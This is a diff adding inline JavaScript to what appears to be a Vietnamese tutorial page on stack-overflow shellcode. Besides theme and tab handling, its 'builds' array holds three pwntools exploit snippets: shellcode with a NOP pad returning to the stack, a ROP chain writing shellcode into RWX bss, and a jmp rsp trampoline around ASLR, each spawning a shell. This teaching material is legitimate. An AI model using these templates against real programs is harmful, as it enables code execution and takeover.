+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("r2sc-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("r2sc-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var builds=[
+    'context.arch = "amd64"\nsc = asm(shellcraft.sh())          # 44 byte\n\npayload  = sc.ljust(72, b"\\x90")   # shellcode + NOP pad\npayload += p64(0x7fffffffe2a0)     # saved RIP = đầu buffer (ASLR off)\n\n# → ret nhảy vào buffer → shellcode chạy',
+    '# shellcode trong bss RWX (no-PIE, cố định)\nbss = 0x404080\nr = ROP(exe); r.read(0, bss, len(sc)); r.raw(bss)\npayload = b"A"*72 + r.chain()\n# gửi payload, rồi gửi sc → ret vào bss → chạy\n# KHÔNG cần biết địa chỉ stack (bss cố định)',
+    '# jmp rsp — VƯỢT ASLR (không cần địa chỉ tuyệt đối)\njmp_rsp = next(exe.search(asm("jmp rsp")))  # \\xff\\xe4\n\npayload  = b"A"*72\npayload += p64(jmp_rsp)   # saved RIP = jmp rsp\npayload += sc            # shellcode NGAY SAU RIP (rsp trỏ đây)\n# ret → jmp rsp → nhảy tới shellcode (tương đối)'
+  ];
+  var pick=document.getElementById("pick"),builder=document.getElementById("builder");
+  function show(i){builder.textContent=builds[i];
+    [].forEach.call(pick.children,function(b,j){
+      b.style.background=j===i?"var(--accent)":"var(--surface)";
+      b.style.color=j===i?"#fff":"var(--muted)";
+    });}
+  pick.addEventListener("click",function(e){var p=e.target.getAttribute("data-p");if(p!==null)show(+p);});
+  show(0);
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
